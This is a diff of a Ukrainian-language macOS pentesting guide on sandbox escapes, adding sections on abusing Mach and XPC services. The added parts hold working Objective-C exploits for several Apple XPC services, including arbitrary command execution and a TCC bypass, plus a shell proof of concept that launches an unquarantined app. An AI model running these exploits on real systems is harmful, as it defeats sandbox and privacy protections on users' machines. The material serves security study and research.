@@ -10,7 +10,7 @@
 
 Компилятор зв'яже `/usr/lib/libSystem.B.dylib` з бінарним файлом.
 
-Потім **`libSystem.B`** буде викликати кілька інших функцій, поки **`xpc_pipe_routine`** не надішле права програми до **`securityd`**. Securityd перевіряє, чи процес має бути в карантині всередині пісочниці, і якщо так, він буде в карантині.\
+Потім **`libSystem.B`** буде викликати кілька інших функцій, поки **`xpc_pipe_routine`** не надішле права програми до **`securityd`**. Securityd перевіряє, чи процес має бути в карантині всередині пісочниці, і якщо так, то він буде в карантині.\
 Нарешті, пісочниця буде активована за допомогою виклику **`__sandbox_ms`**, який викликатиме **`__mac_syscall`**.
 
 ## Можливі обходи
@@ -24,7 +24,7 @@
 > [!CAUTION]
 > Отже, на даний момент, якщо ви просто здатні створити папку з назвою, що закінчується на **`.app`** без атрибута карантину, ви можете втекти з пісочниці, оскільки macOS лише **перевіряє** атрибут **карантину** в **папці `.app`** та в **основному виконуваному файлі** (і ми вкажемо основний виконуваний файл на **`/bin/bash`**).
 >
-> Зверніть увагу, що якщо пакет .app вже був авторизований для запуску (він має атрибут карантину з прапором авторизації на запуск), ви також можете зловживати ним... за винятком того, що тепер ви не можете записувати всередині **`.app`** пакетів, якщо у вас немає деяких привілейованих TCC дозволів (яких у вас не буде всередині пісочниці).
+> Зверніть увагу, що якщо пакет .app вже був авторизований для запуску (він має атрибут карантину з прапором авторизації на запуск), ви також можете зловживати ним... за винятком того, що тепер ви не можете записувати всередині **пакетів .app**, якщо у вас немає деяких привілейованих дозволів TCC (яких у вас не буде всередині пісочниці).
 
 ### Зловживання функціональністю Open
 
@@ -43,7 +43,7 @@ macos-office-sandbox-bypasses.md
 
 Якщо пісочний процес може **записувати** в місце, де **пізніше буде запущено бінарний файл без пісочниці**, він зможе **втекти, просто помістивши** туди бінарний файл. Гарним прикладом таких місць є `~/Library/LaunchAgents` або `/System/Library/LaunchDaemons`.
 
-Для цього вам може знадобитися **2 кроки**: Зробити процес з **більш ліберальною пісочницею** (`file-read*`, `file-write*`), щоб виконати ваш код, який насправді запише в місце, де він буде **виконаний без пісочниці**.
+Для цього вам може знадобитися навіть **2 кроки**: Зробити процес з **більш ліберальною пісочницею** (`file-read*`, `file-write*`), щоб виконати ваш код, який насправді запише в місце, де він буде **виконаний без пісочниці**.
 
 Перевірте цю сторінку про **місця автозапуску**:
 
@@ -59,12 +59,156 @@ macos-office-sandbox-bypasses.md
 ../../../macos-proces-abuse/
 {{#endref}}
 
+### Доступні системні та користувацькі служби Mach
+
+Пісочниця також дозволяє спілкуватися з певними **службами Mach** через XPC, визначеними в профілі `application.sb`. Якщо вам вдасться **зловживати** однією з цих служб, ви можете бути в змозі **втекти з пісочниці**.
+
+Як зазначено в [цьому звіті](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), інформація про служби Mach зберігається в `/System/Library/xpc/launchd.plist`. Можливо знайти всі системні та користувацькі служби Mach, шукаючи в цьому файлі `<string>System</string>` та `<string>User</string>`.
+
+Більше того, можливо перевірити, чи доступна служба Mach для пісочної програми, викликавши `bootstrap_look_up`:
+```objectivec
+void checkService(const char *serviceName) {
+mach_port_t service_port = MACH_PORT_NULL;
+kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
+if (!err) {
+NSLog(@"available service:%s", serviceName);
+mach_port_deallocate(mach_task_self_, service_port);
+}
+}
+
+void print_available_xpc(void) {
+NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
+NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
+for (NSString* key in launchDaemons) {
+NSDictionary<NSString*, id>* job = launchDaemons[key];
+NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
+for (NSString* serviceName in machServices) {
+checkService(serviceName.UTF8String);
+}
+}
+}
+```
+### Доступні PID Mach сервіси
+
+Ці Mach сервіси спочатку були зловжиті для [виходу з пісочниці в цьому звіті](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). На той час **всі XPC сервіси, які вимагалися** додатком та його фреймворком, були видимі в домені PID додатка (це Mach сервіси з `ServiceType` як `Application`).
+
+Щоб **зв'язатися з XPC сервісом домену PID**, потрібно просто зареєструвати його всередині додатка з рядком, таким як:
+```objectivec
+[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
+```
+Крім того, можна знайти всі **Application** Mach сервіси, шукаючи в `System/Library/xpc/launchd.plist` за `<string>Application</string>`.
+
+Інший спосіб знайти дійсні xpc сервіси - перевірити ті, що знаходяться в:
+```bash
+find /System/Library/Frameworks -name "*.xpc"
+find /System/Library/PrivateFrameworks -name "*.xpc"
+```
+Кілька прикладів зловживання цією технікою можна знайти в [**оригінальному описі**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), однак нижче наведені деякі узагальнені приклади.
+
+#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
+
+Ця служба дозволяє кожному XPC з'єднанню, завжди повертаючи `YES`, а метод `runTask:arguments:withReply:` виконує довільну команду з довільними параметрами.
+
+Експлуатація була "такою ж простою, як":
+```objectivec
+@protocol SKRemoteTaskRunnerProtocol
+-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
+@end
+
+void exploit_storagekitfsrunner(void) {
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
+[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
+[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
+[conn resume];
+
+[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
+NSLog(@"run task result:%@, error:%@", bSucc, error);
+}];
+}
+```
+#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
+
+Ця XPC служба дозволяла кожному клієнту завжди повертати YES, а метод `createZipAtPath:hourThreshold:withReply:` в основному дозволяв вказати шлях до папки для стиснення, і він стисне її у ZIP файл.
+
+Отже, можливо створити фальшиву структуру папок додатка, стиснути її, а потім розпакувати та виконати, щоб вийти з пісочниці, оскільки нові файли не матимуть атрибута карантину.
+
+Експлойт був:
+```objectivec
+@protocol AudioAnalyticsHelperServiceProtocol
+-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+@end
+void exploit_AudioAnalyticsHelperService(void) {
+NSString *currentPath = NSTemporaryDirectory();
+chdir([currentPath UTF8String]);
+NSLog(@"======== preparing payload at the current path:%@", currentPath);
+system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
+[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
+system("chmod +x compressed/poc.app/Contents/MacOS/poc");
+
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
+[conn resume];
+
+[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
+NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
+NSString *file;
+while ((file = [dirEnum nextObject])) {
+if ([[file pathExtension] isEqualToString: @"zip"]) {
+// open the zip
+NSString *cmd = [@"open " stringByAppendingString:file];
+system([cmd UTF8String]);
+
+sleep(3); // wait for decompression and then open the payload (poc.app)
+NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
+system([cmd2 UTF8String]);
+break;
+}
+}
+}];
+}
+```
+#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
+
+Ця XPC служба дозволяє надати доступ на читання та запис до довільного URL для XPC клієнта через метод `extendAccessToURL:completion:`, який приймав будь-яке з'єднання. Оскільки XPC служба має FDA, можливо зловживати цими дозволами, щоб повністю обійти TCC.
+
+Експлойт був:
+```objectivec
+@protocol WFFileAccessHelperProtocol
+- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
+@end
+typedef int (*PFN)(const char *);
+void expoit_ShortcutsFileAccessHelper(NSString *target) {
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
+[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
+[conn resume];
+
+[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
+NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
+NSURL *targetURL = [fpWrapper url];
+
+void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
+PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
+if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
+NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
+else {
+NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
+NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
+}
+}];
+}
+```
 ### Статичне компілювання та динамічне зв'язування
 
-[**Це дослідження**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) виявило 2 способи обійти пісочницю. Оскільки пісочниця застосовується з користувацького простору, коли бібліотека **libSystem** завантажується. Якщо бінарний файл зможе уникнути її завантаження, він ніколи не буде підпадати під пісочницю:
+[**Це дослідження**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) виявило 2 способи обійти Sandbox. Оскільки sandbox застосовується з userland, коли бібліотека **libSystem** завантажується. Якщо бінарний файл міг уникнути його завантаження, він ніколи не потрапив би під sandbox:
 
 - Якщо бінарний файл був **повністю статично скомпільований**, він міг би уникнути завантаження цієї бібліотеки.
-- Якщо **бінарний файл не потребував би завантаження жодних бібліотек** (оскільки зв'язувач також знаходиться в libSystem), йому не потрібно буде завантажувати libSystem.
+- Якщо **бінарний файл не потребував би завантаження жодних бібліотек** (оскільки лінкер також знаходиться в libSystem), йому не потрібно буде завантажувати libSystem.
 
 ### Shellcodes
 
@@ -73,9 +217,26 @@ macos-office-sandbox-bypasses.md
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
-### Entitlements
+### Не успадковані обмеження
 
-Зверніть увагу, що навіть якщо деякі **дії** можуть бути **дозволені пісочницею**, якщо у програми є конкретне **право**, як у:
+Як пояснено в **[бонусі цього звіту](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, обмеження пісочниці, такі як:
+```
+(version 1)
+(allow default)
+(deny file-write* (literal "/private/tmp/sbx"))
+```
+може бути обійдено новим процесом, що виконується, наприклад:
+```bash
+mkdir -p /tmp/poc.app/Contents/MacOS
+echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
+chmod +x /tmp/poc.app/Contents/MacOS/poc
+open /tmp/poc.app
+```
+Однак, звичайно, цей новий процес не успадкує права або привілеї від батьківського процесу.
+
+### Права
+
+Зверніть увагу, що навіть якщо деякі **дії** можуть бути **дозволені пісочницею**, якщо додаток має конкретне **право**, як у:
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -93,7 +254,7 @@ ld: dynamic executables or dylibs must link with libSystem.dylib for architectur
 ../../../macos-proces-abuse/macos-function-hooking.md
 {{#endref}}
 
-#### Interpost `_libsecinit_initializer`, щоб запобігти пісочниці
+#### Інтерпост `_libsecinit_initializer`, щоб запобігти пісочниці
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
